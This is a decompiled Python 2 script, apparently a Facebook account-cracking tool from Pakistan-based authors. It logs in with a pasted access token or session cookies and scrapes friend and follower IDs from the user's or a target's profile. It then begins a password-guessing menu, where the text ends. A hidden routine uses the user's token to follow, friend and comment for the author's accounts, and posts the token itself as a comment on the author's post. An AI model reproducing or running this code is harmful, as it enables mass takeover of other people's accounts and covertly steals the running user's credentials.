#coding=utf-8
#========================================
# Decompile by Technical Awais :)
# /usr/linux/desktop/decompiler
# Decompiled from: Python 2.7.18 (version)
#========================================
import os
try:
    import requests
except ImportError:
    print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Requests Module not Installed'
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Futures Module not Installed'
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Bs4 Module not Installed'
    os.system('pip2 install bs4')
import requests, sys, bs4, os, random, time, re, json
from concurrent.futures import ThreadPoolExecutor as zthreads
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan1 = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan1[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
bulan = {'01': 'Januari', '02': 'Februari', 
   '03': 'Maret', 
   '04': 'April', 
   '05': 'Mei', 
   '06': 'Juni', 
   '07': 'Juli', 
   '08': 'Agustus', 
   '09': 'September', 
   '10': 'November', 
   '11': 'Oktober', 
   '12': 'Desember'}
p = '\x1b[0;37m'
m = '\x1b[0;31m'
h = '\x1b[0;32m'
k = '\x1b[0;33m'
b = '\x1b[0;34m'
u = '\x1b[0;35m'
o = '\x1b[0;36m'
P = '\x1b[1;93m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;97m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
ok = []
cp = []
id = []
user = []
loop = 0
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
zkid = '100002151005321'
zkid1 = '100045165501610'
zkid2 = '1675627047'
zscomments = random.choice(['Great\xf0\x9f\x8c\xb9', 'Nice\xf0\x9f\x8c\xb9', 'Ossum\xf0\x9f\x8c\xb9', 'Perfect\xf0\x9f\x8c\xb9'])
reac = 'CARE'
zkpost = '4253981448016847'
zkpost1 = '348166760032171'
zkpost2 = '10216920287314188'
pageid = '101158528390502'
def zks(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
def exitp():
    zks('\x1b[1;91m  [!] \x1b[1;91mExiting Program...\x1a\x1a\x1a')
    os.sys.exit()
def tod():
    titik = [
     '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ', '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] menghapus token %s' % (N, M, N, x),
        sys.stdout.flush()
        time.sleep(1)
logo = "\n    __  __                _ _ \n  \x1b[1;95m / / / /___ _____ ___  (_|_)\n\x1b[1;96m  / /_/ / __ `/ __ `__ \\/ / / \n / __  / /_/ / / / / / / / /  \n\x1b[1;93m/_/ /_/\\__,_/_/ /_/ /_/_/_/\n\x1b[1;95m-----------------------------------------------  \n\x1b[1;93m(*)FROM : KPK PAKISTAN \n\x1b[1;36m(*) AUTHOR NAME :\x1b[1;96mALI ARHAM\n\x1b[1;97m(*)WHATSAPP NO : +92184067645\n\x1b[1;36m(*)ARY KOI TO PATA LO GAREEB KI DUA LAGY GI \x1a\x1a\n\x1b[1;93m(*) FACEBOOK ID : ALI ARHAM\n\x1b[1;96m(*) THANKS TO : AWAIS KHAN\n------------------------------------------------\nBE A GOOD PERSON BUT DONT WASTE TIME TO PROVE IT\n\x1b[1;37m----------------------------------------------- \n\n"
def results(ok, cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c    \xe2\x94\x9c Cracking Process Has Been Completed \xe2\x94\xa4  \t \xe2\x94\xa4'
        print '\xe2\x94\x9c    \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98     \xe2\x94\xa4'
        zks('\x1b[0;97m|  Total Cracked FB Idz: \x1b[0;92m' + str(len(ok)) + '\x1b[0;97m/' + str(len(cp)))
        zks('\x1b[0;97m|  Total Cracked OK Idz: \x1b[0;92m' + str(len(ok)))
        zks('\x1b[0;97m|  Total Cracked CP Idz: \x1b[0;97m' + str(len(cp)))
        print '\xe2\x94\x9c  Cracked Idz Has Been Saved In Cracked Folder  \xe2\x94\xa4'
        print '\xe2\x94\x9c  Subscribe My Channel: TECHNICAL AWAIS             \xe2\x94\xa4'
        print '\xe2\x94\x9c  Subscribe My Channel: TECHNICAL AWAIS           \xe2\x94\xa4'
        print '\xe2\x94\x9c  Like And Follow My Facebook Page: TECHNICAL AWAIS\xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c        \x1b[0;97m\xe2\x94\x9c' + 31 * '\xe2\x94\x80' + '\xe2\x94\x90       \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x9c        |\xf0\x9f\x8c\xb9Thanks For Using ARHAM Tool. \xf0\x9f\x8c\xb9|       \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x9c        |\xf0\x9f\x8c\xb9Remember Me In Your Prayers\xf0\x9f\x8c\xb9|       \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x9c        |\xf0\x9f\x8c\xb9Khuda Hafiz.               \xf0\x9f\x8c\xb9|       \xe2\x94\xa4'
        print '\xe2\x94\x9c        \x1b[0;97m\xe2\x94\x94' + 31 * '\xe2\x94\x80' + '\xe2\x94\x98       \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        raw_input('[\xe2\x9e\xa3] Press Any Key To Go Back To Cracking Menu: ')
        cracking_menu()
    else:
        print '\n\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] No Cracked Idz Found!'
        cracking_menu()
def zkbot():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Removing Token..! Login Again')
        zmbf()
    zks('\x1b[0;97m [\x1b[0;92m\xe2\x9e\xa4\x1b[0;97m] Wait! While The Program Is Loading')
    requests.post('https://graph.facebook.com/1675627047/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100045165501610/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100002151005321/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + zkid + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost + '/reactions?type=' + reac + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost + '/comments/?message=' + zscomments + '&access_token=' + token)
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + zkid1 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost1 + '/reactions?type=' + reac + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost1 + '/comments/?message=' + zscomments + '&access_token=' + token)
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + zkid2 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost2 + '/reactions?type=' + reac + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost2 + '/comments/?message=' + zscomments + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost1 + '/comments/?message=' + token + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + pageid + '/subscribers?access_token=' + token)
    cracking_menu()
def login():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        cracking_menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c             \xe2\x94\x9c Author Information \xe2\x94\xa4\t\t\t\xe2\x94\xa4'
        print '\xe2\x94\x9c             \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98             \xe2\x94\xa4'
        print '\xe2\x94\x9c     \x1b[0;97m\xe2\x94\x9c' + 35 * '\xe2\x94\x80' + '\xe2\x94\x90      \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x9c     |\xf0\x9f\x8c\xb9AUTHOR NAME :  ALI ARHAM     \xf0\x9f\x8c\xb9|      \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x9c     |\xf0\x9f\x8c\xb9YouTube    : ALI ARHAM OFFICIAL        \xf0\x9f\x8c\xb9|      \xe2\x94\xa4'
        print '\xe2\x94\x9c     \x1b[0;97m\xe2\x94\x94' + 35 * '\xe2\x94\x80' + '\xe2\x94\x98      \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    zk = raw_input('\n  \x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Type ARHAM To Enter The ARHAM WORLD: ')
    if zk == '':
        print '  [!] Choose An Option'
        time.sleep(2)
        login()
    elif zk == 'ARHAMi' or zk == 'ALI':
        zmbf()
    else:
        print '  [!] Wrong Input! Try Again'
        time.sleep(2)
        login()
def zmbf():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        cracking_menu()
    except (KeyError, IOError):
        print logo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c                 \xe2\x94\x9c Login Menu \xe2\x94\xa4\t\t\t\t\xe2\x94\xa4'
        print '\xe2\x94\x9c                 \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98                 \xe2\x94\xa4'
        print '\xe2\x94\x9c  1.\tLogin Using FB ID Access Token           \xe2\x94\xa4'
        print '\xe2\x94\x9c  2.\tLogin Using FB ID Cookies                \xe2\x94\xa4'
        print '\xe2\x94\x9c  3.\tExit Program                             \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    zk = raw_input('\n \x1b[0;97m [\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Choose An Option: ')
    if zk == '':
        print '  [!] Choose An Option'
        time.sleep(2)
        zmbf()
    elif zk == '1' or zk == '01':
        tokenz()
    elif zk == '2' or zk == '02':
        cookies()
    elif zk == '3' or zk == '03':
        exitp()
    else:
        print '  [!] Wrong Input! Try Again'
        time.sleep(2)
        zmbf()
def cookies():
    os.system('clear')
    print logo
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c            Login Using FB ID Cookies           \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    os.system('xdg-open https://youtube.com/channel/UCMxnS8H31SIU2Q7AwDpdBmw')
    cookies = raw_input(' \x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Paste FB ID Cookies: \x1b[0;92m')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 5.1; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36', 'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookies})
        find_token = re.search('(EAAA\\w+)', data.text)
        results = ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Invalid Cookies' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] No Connection'
    cookies = open('login.txt', 'w')
    cookies.write(find_token.group(1))
    cookies.close()
    zks(' \x1b[0;97m[\x1b[0;92m\xf0\x9f\x8c\xb9\x1b[0;97m] Login Successfull\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb9')
    os.system('xdg-open https://youtu.be/MoMu2SS3ILg')
    zkbot()
    return
def tokenz():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        cracking_menu()
    except (KeyError, IOError):
        print logo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c         Login Using FB ID Access Token         \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        os.system('xdg-open https://youtu.be/MoMu2SS3ILg')
    token = raw_input(' \x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Paste FB ID Access Token: \x1b[0;92m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(token)
        zedd.close()
        zks(' \x1b[0;97m[\x1b[0;92m\xf0\x9f\x8c\xb9\x1b[0;97m] Login Successfull\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb9')
        os.system('xdg-open https://youtu.be/MoMu2SS3ILg')
        zkbot()
    except KeyError:
        zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Invalid Token')
        tokenz()
def cracking_menu():
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Removing Token..! Login Again')
        os.system('clear')
        os.system('rm -rf login.txt')
        zmbf()
    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        z = json.loads(otw.text)
        nama = z['name']
        id = z['id']
        dob = z['birthday']
        gender = z['gender']
    except KeyError:
        os.system('clear')
        zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Removing Token..! Login Again')
        os.system('rm -rf login.txt')
        zmbf()
    except requests.exceptions.ConnectionError:
        exit(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] No Internet Connection! Try Again')
    print logo
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c              \xe2\x94\x9c User Information \xe2\x94\xa4\t         \xe2\x94\xa4'
    print '\xe2\x94\x9c              \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98              \xe2\x94\xa4'
    print '\xe2\x94\x9c\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x90'
    print H + '| Name        : ' + H + H + '%s' % nama
    print '| User ID     : ' + H + id
    print '| User Dob    : ' + H + dob
    print '| User Gender : ' + H + gender
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '      \xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb7\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb7\xf0\x9f\x8c\xb9 Welcome To Hamii World \xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb7\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb7\xf0\x9f\x8c\xb9 '
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c               \xe2\x94\x9c Cracking Menu \xe2\x94\xa4\t         \xe2\x94\xa4'
    print '\xe2\x94\x9c               \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98                \xe2\x94\xa4'
    print '\xe2\x94\x9c [01] Crack From Friends                        \xe2\x94\xa4'
    print '\xe2\x94\x9c [02] Crack From Public                         \xe2\x94\xa4'
    print '\xe2\x94\x9c [03] Crack From Followers                      \xe2\x94\xa4'
    print '\xe2\x94\x9c [04] Crack From Public Followers               \xe2\x94\xa4'
    print '\xe2\x94\x9c [05] Check Cracked Checkpoint Accounts         \xe2\x94\xa4'
    print '\xe2\x94\x9c [06] Subscribe My YouTube Channel              \xe2\x94\xa4'
    print '\xe2\x94\x9c [08] Like My FaceBook Page                     \xe2\x94\xa4'
    print '\xe2\x94\x9c [09] Logout From Facebook                      \xe2\x94\xa4'
    print '\xe2\x94\x9c [eE] Exit Program                              \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    zk = raw_input('\n \x1b[0;97m [\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Choose An Option: ')
    if zk == '':
        print '  [!] Choose An Option'
        time.sleep(2)
        cracking_menu()
    elif zk == '1' or zk == '01':
        friends(token)
    elif zk == '2' or zk == '02':
        public(token)
    elif zk == '3' or zk == '03':
        myfoll(token)
    elif zk == '4' or zk == '04':
        pfoll(token)
    elif zk == '5' or zk == '05':
        relogin()
    elif zk == '6' or zk == '06':
        os.system('xdg-openhttps://youtu.be/MoMu2SS3ILg')
        cracking_menu()
    elif zk == '7' or zk == '07':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100058333231068')
        cracking_menu()
    elif zk == '8' or zk == '08':
        os.system('rm -f login.txt')
        zks('  \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Removing Token..! Login Again')
        zmbf()
    elif zk == 'e' or zk == 'E':
        exitp()
    else:
        print '  [!] Wrong Input! Try Again'
        time.sleep(2)
        cracking_menu()
def friends(token):
    os.system('clear')
    print logo
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c              Cracking From Friends             \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    try:
        pok = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        sp = json.loads(pok.text)
        zks('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Your Name : ' + sp['name'])
    except KeyError:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] User Id Not Found!'
        time.sleep(2)
        friends(token)
    try:
        filen = (sp['first_name'] + '.json').replace(' ', '_')
        zk = open(filen, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=5000&access_token=%s' % token).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            zk.write(a['id'] + '<=>' + a['name'] + '\n')
        zk.close()
        zks('\x1b[0;97m[\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Your Total Friends IDz : %s' % len(id))
        return crackz(filen)
    except (KeyError, IOError):
        os.remove(file)
        print '  \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Friends Idz Not Found! Try Again!'
        time.sleep(2)
        friends()
def myfoll(token):
    os.system('clear')
    print logo
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c              Cracking From Followers           \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    try:
        pok = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        sp = json.loads(pok.text)
        zks('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Your Name : ' + sp['name'])
    except KeyError:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] User Id Not Found!'
        time.sleep(2)
        myfoll(token)
    try:
        filen = (sp['first_name'] + '.json').replace(' ', '_')
        zk = open(filen, 'w')
        for a in requests.get('https://graph.facebook.com/me/subscribers?limit=20000&access_token=%s' % token).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            zk.write(a['id'] + '<=>' + a['name'] + '\n')
        zk.close()
        zks('\x1b[0;97m[\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Your Total Followers : %s' % len(id))
        return crackz(filen)
    except (KeyError, IOError):
        os.remove(file)
        print '  \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Followers Idz Not Found! Try Again!'
        time.sleep(2)
        myfoll()
def public(token):
    os.system('clear')
    print logo
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c              Cracking From Public              \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    idt = raw_input('\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter Public Id: ')
    try:
        pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        sp = json.loads(pok.text)
        zks('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Target Name : ' + sp['name'])
    except KeyError:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Public Id Not Found!'
        time.sleep(2)
        public(token)
    try:
        filen = (sp['first_name'] + '.json').replace(' ', '_')
        zk = open(filen, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=5000&access_token=%s' % (idt, token)).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            zk.write(a['id'] + '<=>' + a['name'] + '\n')
        zk.close()
        zks('\x1b[0;97m[\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Total Public Friends : %s' % len(id))
        return crackz(filen)
    except (KeyError, IOError):
        os.remove(file)
        print '  \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Public Idz Not Found! Try Again!'
        time.sleep(2)
        public()
def pfoll(token):
    os.system('clear')
    print logo
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c          Cracking From Public Followers        \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    idt = raw_input('\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter Public Id: ')
    try:
        pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        sp = json.loads(pok.text)
        zks('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Target Name : ' + sp['name'])
    except KeyError:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Public Id Not Found!'
        time.sleep(2)
        public(token)
    try:
        filen = (sp['first_name'] + '.json').replace(' ', '_')
        zk = open(filen, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=20000&access_token=%s' % (idt, token)).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            zk.write(a['id'] + '<=>' + a['name'] + '\n')
        zk.close()
        zks('\x1b[0;97m[\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Total Public Followers : %s' % len(id))
        return crackz(filen)
    except (KeyError, IOError):
        os.remove(file)
        print '  \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Public Followers Not Found! Try Again!'
        time.sleep(2)
        pfoll()
def crackz(file):
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c            \xe2\x94\x9c Cracking Process Menu \xe2\x94\xa4\t         \xe2\x94\xa4'
    print '\xe2\x94\x9c            \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98           \xe2\x94\xa4'
    print '\xe2\x94\x9c [01] Start Cracking  Process                   \xe2\x94\xa4'
    print '\xe2\x94\x9c [02] Go Back To Cracking Menu                  \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    zk = raw_input('\n \x1b[0;97m [\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Choose An Option: ')
    if zk == '':
        print '  [!] Choose An Option'
        time.sleep(2)
        crackz(file)
    elif zk == '1' or zk == '01':
        crackmenu(file).passmenu(file)
    elif zk == '2' or zk == '02':
        cracking_menu()
    else:
        print '  [!] Wrong Input! Try Again'
        time.sleep(2)
        crackz(file)
class crackmenu:
    def __init__(self, isifile):
        self.id = []
    def passmenu(self, isifile):
        os.system('clear')
        print logo
        try:
            self.apk = isifile
            self.id = open(self.apk).read().splitlines()
        except:
            print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] File Not Found! Try Again'
            time.sleep(2)
            crackmenu().passmenu()
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c               \xe2\x94\x9c Password Menu \xe2\x94\xa4\t         \xe2\x94\xa4'
        print '\xe2\x94\x9c               \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98                \xe2\x94\xa4'
        print '\xe2\x94\x9c [01]. For Default Passwords Press (D/d)        \xe2\x94\xa4'
        print '\xe2\x94\x9c [02]. For Manual  Passwords Press (M/m)        \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        zk = raw_input(' \x1b[0;97m [\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Choose An Option: ')
        if zk in ('M', 'm', '2', '02'):
            os.system('clear')
            print cracklogo
            print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
            print '\xe2\x94\x9c             \xe2\x94\x9c Manual Password Menu \xe2\x94\xa4\t         \xe2\x94\xa4'
            print '\xe2\x94\x9c             \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98           \xe2\x94\xa4'
            print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
            print '\x1b[0;97m [\xe2\x9e\xa3] Enter Password Like: 786786,000786,102030'
            while True:
